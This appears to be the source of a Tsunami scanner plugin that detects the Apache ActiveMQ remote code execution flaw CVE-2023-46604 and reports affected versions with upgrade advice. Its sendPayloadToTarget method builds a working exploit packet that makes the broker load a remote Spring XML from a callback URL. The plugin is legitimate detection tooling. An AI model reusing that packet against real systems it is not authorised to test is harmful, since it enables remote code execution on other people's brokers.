/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202346604;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.HostAndPort;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.common.net.socket.TsunamiSocketFactory;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForServiceName;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.cves.cve202346604.Annotations.OobSleepDuration;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.TransportProtocol;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.net.Socket;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.Map;
import javax.inject.Inject;
import javax.inject.Qualifier;
import org.apache.activemq.util.MarshallingSupport;

/** A {@link VulnDetector} that detects the CVE-2023-46604 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Apache ActiveMQ RCE CVE-2023-46604 Detector",
    version = "0.1",
    description = Cve202346604Detector.DESCRIPTION,
    author = "hh-hunter",
    bootstrapModule = Cve202346604DetectorBootstrapModule.class)
@ForServiceName({"apachemq"})
public final class Cve202346604Detector implements VulnDetector {

  @VisibleForTesting
  static final String DESCRIPTION =
      "Apache ActiveMQ is vulnerable to Remote Code Execution (RCE). This vulnerability could allow"
          + " a remote attacker with network access to a broker to execute arbitrary shell commands"
          + " by manipulating serialized class types within the OpenWire protocol, causing the"
          + " broker to instantiate any class on the classpath.";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final ImmutableList<String> SECURE_VERSIONS =
      ImmutableList.of("5.15.16", "5.16.7", "5.17.6", "5.18.3");

  private final Clock utcClock;
  private final TsunamiSocketFactory socketFactory;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;

  private boolean useOobVerifyVulnerable;

  private String currentVersion;

  @Inject
  Cve202346604Detector(
      @UtcClock Clock utcClock,
      TsunamiSocketFactory socketFactory,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    this.socketFactory = checkNotNull(socketFactory);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  public static boolean checkVersionIsSecure(String currentVersion) {
    String[] parts1 = currentVersion.split("\\.");
    for (String secureVersion : SECURE_VERSIONS) {
      String[] parts2 = secureVersion.split("\\.");
      if (parts1[0].equals(parts2[0])) {
        if (parts1[1].equals(parts2[1])) {
          return Integer.parseInt(parts1[2]) >= Integer.parseInt(parts2[2]);
        }
      }
    }
    // If no secure minor version matches the current version, it's considered not secure by
    // default.
    return false;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-46604 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isTransportProtocolTcp)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(getAdvisory(AdditionalDetail.getDefaultInstance()));
  }

  Vulnerability getAdvisory(AdditionalDetail details) {
    return Vulnerability.newBuilder()
        .setMainId(
            VulnerabilityId.newBuilder()
                .setPublisher("TSUNAMI_COMMUNITY")
                .setValue("CVE_2023_46604"))
        .addRelatedId(VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-46604"))
        .setSeverity(useOobVerifyVulnerable ? Severity.CRITICAL : Severity.HIGH)
        .setTitle("CVE-2023-46604 Apache ActiveMQ RCE")
        .setRecommendation("Upgrade to version 5.15.16, 5.16.7, 5.17.6, or 5.18.3")
        .setDescription(DESCRIPTION)
        .addAdditionalDetails(details)
        .build();
  }

  private boolean isTransportProtocolTcp(NetworkService networkService) {
    return TransportProtocol.TCP.equals(networkService.getTransportProtocol());
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    HostAndPort hp = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());
    currentVersion = getServerVersion(hp.getHost(), hp.getPort());
    if (checkVersionIsSecure(currentVersion)) {
      logger.atInfo().log("The target version %s is not susceptible.", currentVersion);
      return false;
    }

    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build();

    Payload payload = this.payloadGenerator.generate(config);
    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      return true;
    }
    useOobVerifyVulnerable = true;
    try {
      boolean sendPayloadResult = this.sendPayloadToTarget(hp.getHost(), hp.getPort(), payload);
      if (!sendPayloadResult) {
        logger.atInfo().log("Send payload to target %s failed", hp.toString());
        return false;
      }

      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));

      if (payload.checkIfExecuted()) {
        logger.atInfo().log("Target %s is vulnerable", hp.toString());
        return true;
      } else {
        logger.atInfo().log("Target %s is not vulnerable", hp.toString());
        return false;
      }
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", hp.toString());
    }
    return false;
  }

  // Generate payload for Apache ActiveMQ RCE(CVE-2023-46604), and use socket to send payload
  private boolean sendPayloadToTarget(String host, int port, Payload payload) {
    try {
      String payloadString = payload.getPayload();
      if (!payloadString.startsWith("http://") && !payloadString.startsWith("https://")) {
        payloadString = "http://" + payloadString;
      }
      Socket socket = socketFactory.createSocket(host, port);
      OutputStream os = socket.getOutputStream();
      DataOutputStream dos = new DataOutputStream(os);
      // Size
      dos.writeInt(0);
      // Type
      dos.writeByte(31);
      // CommandId
      dos.writeInt(0);
      // Command response required
      dos.writeBoolean(false);
      // CorrelationId
      dos.writeInt(0);
      // body
      dos.writeBoolean(true);
      // UTF
      dos.writeBoolean(true);
      dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
      dos.writeBoolean(true);
      dos.writeUTF(payloadString);

      dos.close();
      os.close();
      socket.close();
      return true;
    } catch (IOException e) {
      return false;
    }
  }

  private String getServerVersion(String serverAddress, int serverPort) {
    try {
      Socket socket = socketFactory.createSocket(serverAddress, serverPort);
      DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
      byte[] header = new byte[22];
      dataInputStream.readFully(header);
      Map<String, Object> maps = MarshallingSupport.unmarshalPrimitiveMap(dataInputStream, 4096);
      return maps.get("ProviderVersion").toString();
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Get Target Version Failed");
      return "";
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    TextData details =
        TextData.newBuilder().setText("The detected software version is " + currentVersion).build();
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(
            useOobVerifyVulnerable
                ? DetectionStatus.VULNERABILITY_VERIFIED
                : DetectionStatus.VULNERABILITY_PRESENT)
        .setVulnerability(getAdvisory(AdditionalDetail.newBuilder().setTextData(details).build()))
        .build();
  }

  @Qualifier
  @Retention(RetentionPolicy.RUNTIME)
  @interface SocketFactoryInstance {}
}
